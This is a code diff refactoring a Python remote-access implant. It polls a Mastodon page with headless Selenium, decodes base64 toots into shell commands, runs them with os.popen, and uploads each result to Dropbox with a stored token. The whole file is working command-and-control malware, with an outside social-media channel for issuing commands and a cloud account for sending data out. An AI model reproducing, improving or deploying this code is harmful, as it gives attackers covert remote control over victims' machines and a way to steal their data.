@@ -25,11 +25,13 @@ def get_credentials():
     # Get dropbox token from the config file
     dropbox_token = config["dropbox_token"]
 
-# get latest command from the user with Selenium
-def get_latest_command():
+# Prepare the browser
+def set_browser(url):
     # Set Firefox options
     options = Options()
-    options.add_argument("--headless")
+
+    # Set the browser to headless
+    options.headless = True
 
     # Get the page with gecko driver headless
     driver = webdriver.Firefox(options=options)
@@ -40,74 +42,116 @@ def get_latest_command():
     # Wait for the page to load
     time.sleep(1)
 
-    # Get the latest toot
-    latest_toot = driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div[2]/div[2]/div/div/div/article[1]/div/div/div[1]/div/p").text
+    # Return the driver
+    return driver
 
-    # Close the driver
-    driver.close()
+def get_latest_command(driver):
+    # Loop until we get a command
+    while True:
+        try:
+            # Refresh the page
+            driver.refresh()
 
-    # Decode the toot
-    command = base64.b64decode(latest_toot).decode("utf-8")
+            # Wait for the page to load
+            time.sleep(1)
 
-    # Return the command
-    return command
+            # Get the latest toot
+            latest_toot = driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div[2]/div[2]/div/div/div/article[1]/div/div/div[1]/div/p").text
 
-# Use dropbox api to upload the file
-def upload_output():
+            # Decode the toot
+            command = base64.b64decode(latest_toot).decode("utf-8")
+
+            # Return the command
+            return command
+        except:
+            # Print status
+            print("[*] Couldn't get latest command, trying soon again")
+
+            # Wait for a random amount of time
+            time.sleep(random.randint(20, 30))
+
+
+def execute_command(command):
+    # Print status
+    print("[*] Executing command...")
+
+    # Execute the command
+    output = os.popen(command).read()
+
+    # Print status
+    print("[*] Command executed")
+
+    # Return the output
+    return output
+
+def upload_output(output):
     # Print status
     print("[*] Uploading output to dropbox...")
-    # Get the output file
-    output = open("output.txt", "rb")
 
-    # Upload the file
+    # Upload the output
     dbx = dropbox.Dropbox(dropbox_token)
-    dbx.files_upload(output.read(), "/output.txt", mode=dropbox.files.WriteMode.overwrite)
+
+    # Encode the output
+    output = output.encode("utf-8")
+
+    # Set the output file name as the current time in the format ddmmYYYYHHMMSS
+    output_file_name = time.strftime("%d%m%Y%H%M%S")
+
+    # Upload the output
+    dbx.files_upload(output, "/output/" + output_file_name + ".txt")
 
     # Print status
-    print("[*] Output uploaded to dropbox!")
+    print("[*] Output uploaded")
 
-# Listen for commands and execute them
-def listen_for_commands():
+# Listen for commands
+def listen():
+    # Get the driver
+    driver = set_browser(url)
+
+    # Print status
+    print("[*] Getting first command...")
+
+    # Get the first command
+    command = get_latest_command(driver)
+
     # Print status
     print("[*] Listening for commands...")
-    # Get the latest command
-    command = get_latest_command()
 
-    # listen periodically for new toots
+    # Loop forever to listen for commands
     while True:
         # Get the latest command
-        try:
-            latest_command = get_latest_command()
-        except:
-            print("[!] Error getting latest command")
-            latest_command = command
+        latest_command = get_latest_command(driver)
 
-        # Check if the latest toot is equal to the previous one
+        # Check if the command is different
         if latest_command != command:
-            # Print the command
-            print("[+] Executing command: " + latest_command)
+            # Print status
+            print("[*] New command received")
 
-            # Execute the command if it is different and get the output
-            output = os.popen(latest_command).read()
+            # Execute the command
+            output = execute_command(latest_command)
 
-            # Save the output to a file
-            with open("output.txt", "w") as f:
-                f.write(output)
-
-            # Upload the output to dropbox
-            upload_output()
+            # Upload the output
+            upload_output(output)
 
             # Set the command to the latest command
             command = latest_command
         
-        # Sleep for random time between 20 and 30 seconds
+        # Wait for a random amount of time
         time.sleep(random.randint(20, 30))
 
-# main function
+# Main function
 def main():
     # Get the credentials
     get_credentials()
-    listen_for_commands()
 
+    # Listen for commands
+    try:
+        listen()
+    # on keyboard interrupt
+    except KeyboardInterrupt:
+        # Print status
+        print("[*] Keyboard interrupt detected, exiting...")
+
+# Run the main function
 if __name__ == "__main__":
     main()
